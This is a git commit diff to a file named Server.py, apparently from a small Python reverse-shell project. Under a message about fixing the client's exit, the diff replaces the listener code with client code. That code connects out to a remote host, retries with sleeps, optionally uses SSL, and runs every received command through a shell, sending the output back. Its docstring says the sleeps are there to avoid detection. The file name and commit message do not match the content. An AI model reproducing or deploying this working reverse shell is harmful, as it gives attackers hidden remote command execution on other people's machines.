6b10b6ce1cd91af648c943421b0c189675aa80ee
Dylan Forwood <37117314+pyCity@users.noreply.github.com>
2019-01-04 14:18:34 -0600

    Fixed client not exiting properly

--- Server.py
+++ Server.py
@@ -1,110 +1,81 @@
 import socket
-import sys
+import subprocess
+import os
+import time
 import argparse
 import ssl
-import time
+import sys
+
 
 
 """
-Handler for client.py in Python 3. 
-Make sure to run certs.sh before using this script
-If you're unable to run certs.sh, ncat --ssl works just as well.
-USAGE: python3 client.py --ssl 127.0.0.1 4444
+Reverse shell in python 3. Has SSL functionality and periods of sleep to avoid detection.
+To close the shell properly, send "exit" from the server.
+USAGE: python client.py --ssl 127.0.0.1 4444
 """
 
+#TODO Add "get" and "put" functionality
+#TODO add https mode
 
-def get_args():
-    """Define host, port, and encryption variables"""
+def parse_args():
+    """Define host and port variables with optional ssl"""
 
-    parser = argparse.ArgumentParser(description="Python tcp server")
-    parser.add_argument("host", help="IP address to bind for listening")
-    parser.add_argument("port", help="Port to bind for listening", type=int)
-    parser.add_argument("--ssl", help="Enable SSL encryption", action="store_true")
+    parser = argparse.ArgumentParser(description="Python remote tcp client")
+    parser.add_argument("host", help="Remote host name to connect to")
+    parser.add_argument("port", help="Remote port to connect to", type=int)
+    parser.add_argument("--ssl", help="Enable ssl encryption", action="store_true")
 
-    # Array of parsed arguments
+    # Array of parsed arguments (host, port, encryption)
     args = parser.parse_args()
-    host = args.host
-    port = args.port
-    enc = args.ssl
+    host, port, enc = args.host, args.port, args.ssl
     return host, port, enc
 
 
 
-def wrap_sock(enc=False):
-    """Create and wrap socket"""
+def connect_socket(host, port, enc=False):
+    """Create socket object, connect socket to server"""
 
-    try:
-        s = socket.socket(2, 1)
-        if enc == True:
-            print("SSL encryption enabled")
-            s = ssl.wrap_socket(s, server_side=True, certfile="server.crt", keyfile="server.key")
-        return s
-    except socket.error as msg:
-        print("Socket creation error: {}".format(str(msg)))
-        sys.exit()
-
-
-
-
-def bind_sock(s, host, port):
-    """Bind socket to port and wait for client to connect. Avoid recursion with a while loop."""
-
-    max = 10
-    attempts = 0
-    while attempts < max:
+    # Wait 10 secs if connection isn't successful immediately
+    for i in range(10):
         try:
-            print("Binding port: " + str(port))
-            s.bind((host, port))
-            print("Listening for client...")
-            s.listen(5)
+            s = socket.socket()
+            if enc == True:
+                s = ssl.wrap_socket(s)
+            s.connect((host, port))
             return s
-        except socket.error as msg:
-            print("Error binding socket: {}\n  Retrying...".format(str(msg)))
-            time.sleep(3)
-            attempts += 1
+        except:
+            time.sleep(10)
+
+
+
+def serve_payload(s):
+    """Recieve commands from remote server and run on local machine"""
+
+    # Standard reverse shell
+    while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8").strip())
+        elif data[:4].decode("utf-8").strip() == 'kill':
+            break
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+
+            bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
+            output = str(bytes_recieved, "utf-8")
+            s.send(str.encode(output + str(os.getcwd()) + '#> '))
     s.close()
     sys.exit()
-
-
-def handle(s):
-    """Handle connection to client"""
-
-    conn, address = s.accept()
-    print("Connection established from: {} {}".format(address[0], str(address[1])))
-    send_commands(conn)
-    conn.close()
-    s.close()
-
-
-
-def send_commands(conn):
-    """Server loop to send commands until exit"""
-
-    try:
-        while True:
-            cmd = input()
-            if cmd == 'exit':
-                conn.send(str.encode("kill"))
-                break
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(1024), "utf-8")
-                print(client_response, end="")
-
-    except KeyboardInterrupt:
-        # Pass because once we break out of the loop, we go back up to handle and conn.close, s.close
-        pass
 
 
 
 
 def main():
+    host, port, enc = parse_args()
+    serve_payload(connect_socket(host, port, enc))
 
-    host, port, enc = get_args()
-
-    s = bind_sock(wrap_sock(enc), host, port)
-
-    handle(s)
 
 
 if __name__ == "__main__":
